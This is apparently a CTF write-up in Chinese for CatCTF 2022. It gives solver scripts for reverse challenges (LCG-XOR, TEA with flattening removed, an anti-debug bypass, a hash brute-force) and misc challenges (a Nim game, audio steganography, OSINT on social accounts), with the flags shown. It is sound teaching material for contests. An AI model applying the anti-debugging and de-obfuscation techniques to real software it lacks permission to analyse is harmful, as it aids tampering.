<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="CatFly🛫🐱"><a href="#CatFly🛫🐱" class="headerlink" title="CatFly🛫🐱"></a>CatFly🛫🐱</h3><p>计划中是个难度中等偏下的送分RE题，但是解太少了</p>
<p>找到输出文字的地方</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-44-31_6Tbihup_fm.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-47-28_vaWGlJOtng.png" class="">

<p>数据xor于sub_62B5</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-48-39_Xjj97320oU.png" class="">

<p>dword_E1E8 除了函数本身会修改，还有一处地方会修改</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-23-05-08_8MUfX9gl9p.png" class="">

<p>根据printf输出的字符数修改,测试可得 42 + log(count)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> dword_E1E8 = <span class="number">0x1106</span>;</span><br><span class="line"><span class="built_in">int</span> dword_E120[<span class="number">50</span>]=&#123;<span class="number">0x27fb</span>, <span class="number">0x27a4</span>, <span class="number">0x464e</span>, <span class="number">0x0e36</span>, <span class="number">0x7b70</span>, <span class="number">0x5e7a</span>, <span class="number">0x1a4a</span>, <span class="number">0x45c1</span>, <span class="number">0x2bdf</span>, <span class="number">0x23bd</span>, <span class="number">0x3a15</span>, <span class="number">0x5b83</span>, <span class="number">0x1e15</span>, <span class="number">0x5367</span>, <span class="number">0x50b8</span>, <span class="number">0x20ca</span>, <span class="number">0x41f5</span>, <span class="number">0x57d1</span>, <span class="number">0x7750</span>, <span class="number">0x2adf</span>, <span class="number">0x11f8</span>, <span class="number">0x09bb</span>, <span class="number">0x5724</span>, <span class="number">0x7374</span>, <span class="number">0x3ce6</span>, <span class="number">0x646e</span>, <span class="number">0x010c</span>, <span class="number">0x6e10</span>, <span class="number">0x64f4</span>, <span class="number">0x3263</span>, <span class="number">0x3137</span>, <span class="number">0x00b8</span>, <span class="number">0x229c</span>, <span class="number">0x7bcd</span>, <span class="number">0x73bd</span>, <span class="number">0x480c</span>, <span class="number">0x14db</span>, <span class="number">0x68b9</span>, <span class="number">0x5c8a</span>, <span class="number">0x1b61</span>, <span class="number">0x6c59</span>, <span class="number">0x5707</span>, <span class="number">0x09e6</span>, <span class="number">0x1fb9</span>, <span class="number">0x2ad3</span>, <span class="number">0x76d4</span>, <span class="number">0x3113</span>, <span class="number">0x7c7e</span>, <span class="number">0x11e0</span>, <span class="number">0x6c70</span>&#125;;</span><br><span class="line"><span class="built_in">int</span> sub_62B5()</span><br><span class="line">&#123;</span><br><span class="line">  dword_E1E8 = <span class="number">1103515245</span> * dword_E1E8 + <span class="number">12345</span>;</span><br><span class="line">  <span class="keyword">return</span> (dword_E1E8 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> llog(<span class="built_in">int</span> n)&#123;</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n /= <span class="number">10</span>)a++;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> sub_62E3(char a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // rax</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; 0x7Fu) &lt;= <span class="number">0x7E</span> )</span><br><span class="line">    result = (a1 &amp; 0x7Fu) &gt; <span class="number">0x20</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = 0LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    <span class="built_in">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            dword_E120[i]^=sub_62B5();</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">        dword_E1E8+=<span class="number">42</span>+llog(count);</span><br><span class="line">        <span class="keyword">if</span>(count % <span class="number">1000000</span> == <span class="number">0</span> )&#123;</span><br><span class="line">            printf(<span class="string">&quot;Count:%d\n&quot;</span>,count);</span><br><span class="line">        &#125;</span><br><span class="line">        unsigned char flag[<span class="number">51</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            // Loop: <span class="number">100427942</span></span><br><span class="line">            // <span class="keyword">if</span>((dword_E120[i] &amp; <span class="number">0xff00</span>))&#123;</span><br><span class="line">            //     <span class="keyword">break</span>;</span><br><span class="line">            // &#125;</span><br><span class="line">            // Loop: <span class="number">100001958</span></span><br><span class="line">            <span class="keyword">if</span>(!sub_62E3(dword_E120[i]))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            flag[i]=dword_E120[i]&amp;<span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(memcmp(<span class="string">&quot;CatCTF&quot;</span>,flag,<span class="number">6</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            puts(flag);</span><br><span class="line">            printf(<span class="string">&quot;Count:%d\n&quot;</span>,count);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-23-40-31_UlFTSbFYUW.png" class="">

<p>PS: 出题时循环次数为705980581，但是线性同余随机数算法出现了循环导致在100427942就出现了flag，若只考虑数组的最低字节，能在100001958得到flag</p>
<p>附：nyancat开源 <a target="_blank" rel="noopener" href="https://github.com/klange/nyancat" title="https://github.com/klange/nyancat">https://github.com/klange/nyancat</a></p>
<h3 id="ReadingSection"><a href="#ReadingSection" class="headerlink" title="ReadingSection"></a>ReadingSection</h3><p>其实最早的预期解是硬读LLVM IR .txt，因为故意算法设计的很简单，也不是很长，熟悉LLVM IR的选手大概一个多小时可以做出来。后面发现此题可以有更简便的方法。</p>
<p>使用llvm-as可以反序列化IR到.bc文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS D:\2022CTF\Myself\ReadingSection&gt; llvm-<span class="keyword">as</span> .\<span class="number">1.</span>txt -o <span class="number">1.</span>bc</span><br><span class="line">D:\LLVM\Windows\<span class="built_in">bin</span>\llvm-<span class="keyword">as</span>.exe: .\<span class="number">1.</span>txt:<span class="number">9</span>:<span class="number">62</span>: error: constant expression <span class="built_in">type</span> mismatch: got <span class="built_in">type</span> <span class="string">&#x27;[18 x i8]&#x27;</span> but expected <span class="string">&#x27;[33 x i8]&#x27;</span></span><br><span class="line"><span class="meta">@__const.main.flag = private unnamed_addr constant [<span class="number">33</span> x i8] c<span class="string">&quot;CAT Hide Your Flag&quot;</span>, align <span class="number">16</span></span></span><br></pre></td></tr></table></figure>

<p>会有一个报错，这个数组本来是存的flag，被我改掉了导致长度定义与声明不匹配。随便将其数组内容改为33长度即可。然后llvm-as可以成功编译为bc文件。而后用 <em>clang -c</em>将bc编译为.o对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\2022CTF\Myself\ReadingSection&gt; llvm-<span class="keyword">as</span> .\<span class="number">1.</span>txt -o <span class="number">1.</span>bc</span><br><span class="line">PS D:\2022CTF\Myself\ReadingSection&gt; clang -c <span class="number">1.</span>bc</span><br></pre></td></tr></table></figure>

<p>编译成.o对象后，就可以用IDA打开了，打开后会发现check函数是被加了非标准平坦化的。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/1_fXbaW2IWQm.jpg" class="">

<p>然后这就又要用到去混淆神器D810了。把D810插件打开，选用默认规则，再F5，混淆基本被去干净了</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2_5-u8qJkX7a.jpg" class="">

<p>可以看到就是一个异或+TEA</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">data</span>&#123;</span></span><br><span class="line">    BYTE raw[<span class="number">32</span>];</span><br><span class="line">    DWORD data[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BYTE ciphers[] = &#123;</span><br><span class="line"><span class="number">0xAA</span>, <span class="number">0x7D</span>, <span class="number">0x07</span>, <span class="number">0x7D</span>, <span class="number">0xB1</span>, <span class="number">0xF7</span>, <span class="number">0x80</span>, <span class="number">0x71</span>, <span class="number">0xDA</span>, <span class="number">0xAF</span>, <span class="number">0x23</span>, <span class="number">0xE5</span>, <span class="number">0x10</span>, <span class="number">0x07</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x1E</span>, <span class="number">0xF7</span>, <span class="number">0x7D</span>, <span class="number">0x71</span>, <span class="number">0xE6</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x56</span>, <span class="number">0x9B</span>, <span class="number">0xC0</span>, <span class="number">0x53</span>, <span class="number">0x11</span>, <span class="number">0xF3</span>, <span class="number">0x39</span>, <span class="number">0x31</span>, <span class="number">0x2E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">0x18bc8a17</span>, <span class="number">0x29d3ce1e</span>, <span class="number">0x42f740e3</span>, <span class="number">0x199c7f4a</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(DWORD* v, DWORD* k)</span> &#123;  </span><br><span class="line">    DWORD round = <span class="number">28</span>;</span><br><span class="line">    DWORD delta=<span class="number">0xCA7C7F00</span>;    </span><br><span class="line"></span><br><span class="line">    DWORD v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=delta*round, i; </span><br><span class="line">    DWORD k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;round; i++) &#123; </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                              </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data)/<span class="number">8</span>;++i)</span><br><span class="line">        decrypt(&amp;reinterpret_cast&lt;<span class="keyword">union</span> data*&gt;(ciphers)-&gt;data[<span class="number">2</span>*i], reinterpret_cast&lt;DWORD*&gt;(key));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, reinterpret_cast&lt;<span class="keyword">union</span> data*&gt;(ciphers)-&gt;raw[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Part2</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;--i)</span><br><span class="line">        ciphers[i] ^= ciphers[i+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, reinterpret_cast&lt;<span class="keyword">union</span> data*&gt;(ciphers)-&gt;raw[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StupidOrangeCat2-xD"><a href="#StupidOrangeCat2-xD" class="headerlink" title="StupidOrangeCat2&#xD;"></a>StupidOrangeCat2&#xD;</h3><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7" title="https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7">https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7</a><br>提取码：21g7<br>--来自百度网盘超级会员V4的分享</p>
<h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><h4 id="设计思路和解法"><a href="#设计思路和解法" class="headerlink" title="设计思路和解法"></a>设计思路和解法</h4><p>这里先给师傅们磕头了</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_35swh0x-KO.png" class="">

<p>可能很多师傅没有看懂这个题目的意思，直接猜出了概率为0%（其实这是修改后的，修改前可能更看不懂 <a target="_blank" rel="noopener" href="https://www.desmos.com/calculator/wzuskcjd34?lang=zh-CN" title="https://www.desmos.com/calculator/wzuskcjd34">https://www.desmos.com/calculator/wzuskcjd34</a></p>
<p>本题是我在学习概率论时出的，不过这里作为签到题目减去了复杂的计算只需要稍微的分析一下就可以了。</p>
<p>这里“人”在正态分步的函数图像上行走，（这里是采用了中心极限定理，人数应该够了😶）而函数给到的定义域在`-200之间，猫猫的定义域包含正态函数的定义域的。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image-1672646385574_TMufCm2CkE.png" class="">

<p>那么接下来就很简单了，有概率密度求在x在猫猫横坐标之外的概率。由于只给了+-200之间，之间的多余没有给，对立求一个大约的概率为</p>
<p>$$<br>P &#x3D; \lfloor1 - (\Phi(\frac {200-b}a) - \Phi(\frac {-200-b}a)) \rfloor&#x3D; \lfloor 1-(1-2\Phi(\frac {-200-b}a)) \rfloor&#x3D;\lfloor2\Phi(\frac {-200-b}a)\rfloor<br>$$</p>
<p>可以得到概率为0%</p>
<h4 id="猫猫镇楼"><a href="#猫猫镇楼" class="headerlink" title="猫猫镇楼"></a>猫猫镇楼</h4><p>可能让师傅们做的云里雾里的，再次磕头了，整成烂活了。</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/Cat_nlZQ234xAu.jpg" class="">

<p>其实这里面有BGM的</p>
<p><a target="_blank" rel="noopener" href="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%252FfgjZFp4NZA2UpGnWN2k8%252Fuploads%252FwjX2bQFO6aTRM30TAoPc%252Fmusic.mp4?alt=media&token=15f34bd9-1187-4fb2-84c0-79646626c92a">spaces%252FfgjZFp4NZA2UpGnWN2k8%252Fuploads%252FwjX2bQFO6aTRM30TAoPc%252Fmusic.mp4</a></p>
<h3 id="BugCat"><a href="#BugCat" class="headerlink" title="BugCat"></a>BugCat</h3><h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这里给出的是一个预设解，这个解法可能不会是第一次分析该题就可以联想到的，不过却是解题最快的思路，由于详细的思路涉及到出题相关的细节，而且包含许多前置知识点，会在后期更新到如下专栏中，并给出从选手角度来说的预期攻击方案以及从出题人角度对题目的一些分析</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/readlist/rl656546" title="出题小记">出题小记</a></p>
<h4 id="二、解题方案"><a href="#二、解题方案" class="headerlink" title="二、解题方案"></a>二、解题方案</h4><p>打开程序，被要求输入特定字符串，我们简单分析可得到如下信息</p>
<ol>
<li>输入内容为**flag{xxxxxxxxxxxxxxxxxxxxxxxx}**，长度为30</li>
<li>代码内夹杂着大量花指令</li>
<li>代码注册了VEH异常回调，并在其中布置了4个硬件断点且会在特定情况下修改寄存器的值</li>
<li>主体代码没有花指令，非常清晰，是对flag括号内的内容进行hashcode，然后与内置值比较</li>
</ol>
<p>我们首先分析主体代码，会发现如果按这个逻辑计算hashcode，必然存在多解，根据题目描述可知，算法存在BUG，那么注册的异常处理部分应该就是负责修复BUG的存在</p>
<p>这里我们附加程序，处理掉<strong>ZwSetInformationThread</strong>函数，然后修改<strong>ZwCreateThreadEx</strong>函数的Flags参数为2(跳过TLS回调)，之后在主体代码int2d指令后的代码处下断点，观察调试寄存器，得到四个硬件断点的位置，之后分别在相应硬件断点所对应代码前后下断点，调试执行，根据前后寄存器的变化以及被下断点的代码的原始作用可以得出以下信息</p>
<ol>
<li>flag内的内容被四个一组进行hashcode的计算</li>
<li>乘子的值为257</li>
<li>每次hash异或的值会根据启用断点位置及数量的不同而变化，考虑到是CRC的校验值</li>
<li>正确的flag计算结果应该从内置的数组下标(从0开始)2处读取</li>
</ol>
<p>对于寻找CRC校验，我们在可以GetModuleHandleA下断点，可以找到一处被加了大量花指令的代码，简单分析可以知道这里是一处crc校验用代码，这里直接重新载入程序，重设EIP到CRC校验处，在ntdll.LdrxCallInitRoutine的返回处下断点，即可得到正确的CRC校验值</p>
<p>至此，我们得到了解题所需要的所有数据，写个脚本爆破出flag即可</p>
<h4 id="三、解题脚本"><a href="#三、解题脚本" class="headerlink" title="三、解题脚本"></a>三、解题脚本</h4><p>最终解题脚本如下，大约在2分钟内即可爆破出正确的flag</p>
<p><strong>flag{bu9CAT+C@P0o-1S_s0-CUTe~}</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hashTable = [<span class="number">0x66BF1BAC</span>, <span class="number">0x473AC6FC</span>, <span class="number">0x4433C0D0</span>, <span class="number">0x289B6CEF</span>, <span class="number">0x71A8B6EC</span>, <span class="number">0x53775C73</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hashTable)):</span><br><span class="line">    flag.append(<span class="string">b&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">    str1 = <span class="built_in">chr</span>(i1 + <span class="number">33</span>)</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">        str2 = <span class="built_in">chr</span>(i2 + <span class="number">33</span>)</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">            str3 = <span class="built_in">chr</span>(i3 + <span class="number">33</span>)</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">                str4 = <span class="built_in">chr</span>(i4 + <span class="number">33</span>)</span><br><span class="line">                <span class="built_in">hash</span> = <span class="number">0</span></span><br><span class="line">                finalStr = (str1 + str2 + str3 + str4).encode()</span><br><span class="line">                <span class="keyword">for</span> every_char <span class="keyword">in</span> finalStr:</span><br><span class="line">                    <span class="built_in">hash</span> = <span class="number">257</span> * <span class="built_in">hash</span> + every_char</span><br><span class="line">                <span class="built_in">hash</span> ^= <span class="number">0x052251FF</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hash</span> <span class="keyword">in</span> hashTable:</span><br><span class="line">                    flag[hashTable.index(<span class="built_in">hash</span>)] = finalStr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="catnim"><a href="#catnim" class="headerlink" title="catnim"></a>catnim</h3><p>nim博弈而已，有兴趣可以了解具体的博弈思路以及选择的思路，只需要确保我拿走的时候所有石头的异或和为0即可。</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pile</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Now pile: &#x27;</span>)</span><br><span class="line">    line=p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="keyword">return</span> line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xor</span>(<span class="params">piles</span>):</span><br><span class="line">    v=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        v^=num</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xor :&quot;</span>,v)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">piles</span>):</span><br><span class="line">    v=get_xor(piles)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        <span class="keyword">if</span> num-(num^v) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i,num-(num^v)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line">p=remote(<span class="string">&#x27;223.112.5.156&#x27;</span>,<span class="number">55068</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    piles=get_pile()</span><br><span class="line">    pilesnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> piles]</span><br><span class="line">    where,cnt=choose(pilesnum)</span><br><span class="line">    <span class="built_in">print</span>(pilesnum)</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> pilesnum:</span><br><span class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</span><br><span class="line">            s+=<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;where:&#x27;</span>,<span class="built_in">str</span>(where))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;count:&#x27;</span>,<span class="built_in">str</span>(cnt))</span><br><span class="line">    <span class="keyword">if</span> s==<span class="built_in">len</span>(pilesnum)-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    piles=get_pile()</span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#print(pilesnum)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>下载附件得到一个含有音频文件的图片</p>
<p>分离出来一个wav，通过改变频谱可以看到里面有一个CatCTF的字样，那么我们可以猜测这是一个密码</p>
<p>可以尝试关于wav的隐写，是deepsound，使用工具加载文件，提示需要输入密码，那么密码就是CatCTF</p>
<p>得到flag.txt文件，里面有喵呜的字样，猜测是兽语，搜索兽语翻译器<a target="_blank" rel="noopener" href="https://roar.iiilab.com/" title="兽音译者在线编码解码 - 兽音翻译咆哮体加密解密 (iiilab.com)">兽音译者在线编码解码 - 兽音翻译咆哮体加密解密 (iiilab.com)</a></p>
<p>得到最后flag</p>
<p>CatCTF{d0_y0u_Hate_c4t_ba3k1ng <em>?</em> M1ao~}</p>
<h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>躲猫猫，预期解是一个osint题目</p>
<p>通过附件发现水印，是一个qq空间，找到空间后发现有很多二维码（或者说汉信码）</p>
<p>扫一下发现唯一有用的线索：sina.兔<code>*****</code>52258</p>
<p>搜索微博用户兔52258可以找到有关flag的信息</p>
<p>找到用户的王者账号，王者营地搜索对应账号得到本赛季只使用了一个英雄：百里玄策</p>
<p>CatCTF{bailixuance}</p>
<h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010打开直接看答案</p>
<p>CatCTF{CAT_GOES_MEOW}</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_goDEqWj_50.png" class="">

